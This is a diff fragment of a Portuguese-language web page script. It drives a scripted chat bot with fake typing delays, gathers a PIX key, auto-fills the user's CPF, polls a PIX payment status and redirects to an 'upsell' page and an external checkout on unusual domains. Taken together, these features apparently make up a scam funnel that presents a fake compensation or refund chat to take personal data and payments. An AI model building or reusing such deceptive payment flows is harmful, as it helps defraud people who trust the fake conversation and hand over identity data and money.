+          copiarBtn.textContent = 'Código copiado!';
+          setTimeout(() => {
+            copiarBtn.textContent = 'Copiar código Pix';
+          }, 1800);
+        } catch (error) {
+          qrInput.select();
+          document.execCommand('copy');
+          copiarBtn.textContent = 'Código copiado!';
+          setTimeout(() => {
+            copiarBtn.textContent = 'Copiar código Pix';
+          }, 1800);
+        }
+      };
+    }
+
+    function iniciarMonitoramentoPagamento(paymentCode) {
+      if (!paymentCode) return;
+
+      const pixStatus = document.getElementById('pixStatus');
+      let tentativas = 0;
+      const maxTentativas = 120;
+
+      const intervalo = setInterval(async () => {
+        try {
+          const resposta = await fetch(`/api/mangofy-status?paymentCode=${encodeURIComponent(paymentCode)}`);
+          const dados = await resposta.json();
+
+          if (!resposta.ok) {
+            throw new Error(dados?.message || 'Erro ao consultar status do PIX.');
+          }
+
+          const status = (dados?.payment_status || '').toLowerCase();
+          const pixAprovado = document.getElementById('pixAprovado');
+
+          if (pixStatus) {
+            if (status === 'approved') {
+              pixStatus.textContent = 'Pagamento aprovado! Você pode continuar.';
+              if (pixAprovado) {
+                pixAprovado.style.display = 'block';
+              }
+            } else if (status === 'pending' || status === 'in_process') {
+              pixStatus.textContent = 'Aguardando confirmação do pagamento...';
+              if (pixAprovado) pixAprovado.style.display = 'none';
+            } else if (status === 'refused' || status === 'canceled' || status === 'expired') {
+              pixStatus.textContent = 'Pagamento não foi confirmado.';
+              clearInterval(intervalo);
+            } else {
+              pixStatus.textContent = 'Status do pagamento: ' + (dados?.payment_status || 'desconhecido');
+            }
+          }
+
+          if (status === 'approved') {
+            clearInterval(intervalo);
+            if (pixStatus) pixStatus.textContent = 'Pagamento aprovado!';
+            if (pixAprovado) pixAprovado.style.display = 'block';
+            return;
+          }
+
+          if (['refused', 'canceled', 'expired'].includes(status)) {
+            clearInterval(intervalo);
+            return;
+          }
+        } catch (erro) {
+          console.error('Erro ao consultar status do pagamento:', erro);
+        }
+
+        tentativas += 1;
+        if (tentativas >= maxTentativas) {
+          clearInterval(intervalo);
+          if (pixStatus) pixStatus.textContent = 'Tempo de confirmação excedido.';
+        }
+      }, 5000);
+    }
+
+    async function runStep(stepIndex) {
+      state.currentStep = stepIndex;
+      const step = flow[stepIndex];
+      controls.innerHTML = '';
+      controls.classList.remove('active');
+
+      // Delay opcional no início do passo
+      if (step.stepDelay) {
+        const typing = showTyping();
+        await new Promise(r => setTimeout(r, chatDelay(step.stepDelay)));
+        typing.remove();
+      }
+
+      const TYPING_DURATION = 900;
+
+      for (let i = 0; i < step.messages.length; i++) {
+        const msg = step.messages[i];
+        const delayTime = chatDelay(msg.delay || 1500);
+
+        if (delayTime > TYPING_DURATION) {
+          // Wait silently first, then show typing only at the end
+          await new Promise(r => setTimeout(r, delayTime - TYPING_DURATION));
+          const typing = showTyping();
+          await new Promise(r => setTimeout(r, TYPING_DURATION));
+          typing.remove();
+        } else {
+          // Short delay: show typing for the full duration
+          const typing = showTyping();
+          await new Promise(r => setTimeout(r, delayTime));
+          typing.remove();
+        }
+
+        appendMessage('bot', msg.content);
+      }
+      renderControls(step);
+    }
+
+    function renderControls(step) {
+      if (step.type === 'button') {
+        // Render button options INLINE in the chat
+        const optionsContainer = document.createElement('div');
+        optionsContainer.className = 'chat-options fadeIn';
+
+        step.options.forEach(opt => {
+          const btn = document.createElement('button');
+          btn.textContent = opt.label;
+          btn.onclick = () => {
+            if (opt.action === 'redirect') {
+              window.location.href = 'https://indenl.lovable.app/upsell1/index.html' + window.location.search;
+              return;
+            }
+            // Remove the options from the chat
+            optionsContainer.remove();
+
+            // Add user response as a chat bubble
+            appendMessage('user', opt.label);
+            if (opt.value) state.pixType = opt.value;
+
+            // If CPF selected, auto-fill the PIX key and skip to check_pix
+            if (opt.value === 'CPF') {
+              state.pixKey = userCPF;
+              setTimeout(() => {
+                appendMessage('user', userCPF);
+                setTimeout(() => {
+                  const nextIndex = flow.findIndex(f => f.id === 'check_pix');
+                  runStep(nextIndex);
+                }, INTERACTION_DELAY);
+              }, INTERACTION_DELAY);
+              return;
+            }
+
+            setTimeout(() => {
+              const nextIndex = flow.findIndex(f => f.id === opt.next);
+              runStep(nextIndex);
+            }, INTERACTION_DELAY);
+          };
+          optionsContainer.appendChild(btn);
+        });
+
+        chatContent.appendChild(optionsContainer);
+        scrollToBottom();
+
+      } else if (step.type === 'input') {
+        // Show the controls area for input
+        controls.classList.add('active');
+        controls.innerHTML = '';
+
+        const wrapper = document.createElement('div');
+        wrapper.className = 'input-wrapper';
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = step.placeholder;
+        const btn = document.createElement('button');
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i>';
+
+        const submit = () => {
+          const val = input.value.trim();
+          if (val) {
+            if (step.id === 'type_pix') state.pixKey = val;
+            controls.innerHTML = '';
+            controls.classList.remove('active');
+            appendMessage('user', val);
+            setTimeout(() => {
+              const nextIndex = flow.findIndex(f => f.id === step.next);
+              runStep(nextIndex);
+            }, INTERACTION_DELAY);
+          }
+        };
+        btn.onclick = submit;
+        input.onkeypress = (e) => { if (e.key === 'Enter') submit(); };
+        wrapper.appendChild(input);
+        wrapper.appendChild(btn);
+        controls.appendChild(wrapper);
+
+        // Delay para focar no input
+        setTimeout(() => input.focus(), 300);
+      } else if (step.type === 'redirect') {
+        const typing = showTyping();
+        setTimeout(() => {
+          typing.remove();
+          // O fluxo define a URL no campo "url" (não em "redirectUrl").
+          const destino = step.url || step.redirectUrl;
+          if (destino) {
+            window.location.assign(destino);
+          } else {
+            console.error('Etapa de redirecionamento sem URL configurada:', step);
+          }
+        }, 3000);
+      } else if (step.type === 'pix_payment') {
+        const typing = showTyping();
+        setTimeout(() => {
+          typing.remove();
+          // Redireciona o usuário diretamente para o link do checkout
+          window.location.href = 'https://ajudnsecret.online/checkout-ltda1/?id=18e0ff18bbab2d67624749c9';
+        }, 3000);
+      }
+    }
+
+    // Configuração global de delay entre interações
+    const INTERACTION_DELAY = 400;
+
+    window.addEventListener('load', () => {
+      setTimeout(() => { runStep(0); }, 500);
+    });
+  </script>
+   
+</body>
